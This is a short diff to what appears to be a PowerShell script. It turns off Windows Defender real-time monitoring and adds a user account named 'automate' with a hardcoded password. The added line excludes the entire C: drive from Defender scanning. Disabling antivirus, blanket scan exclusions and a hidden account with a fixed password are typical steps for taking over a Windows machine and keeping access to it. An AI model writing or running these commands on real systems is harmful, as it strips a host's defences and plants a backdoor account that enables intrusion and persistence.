@@ -1,4 +1,5 @@
 Set-MpPreference -DisableRealtimeMonitoring $true
+Add-MpPreference -ExclusionPath "C:\"
 
 net user automate Automate123456! /add
 
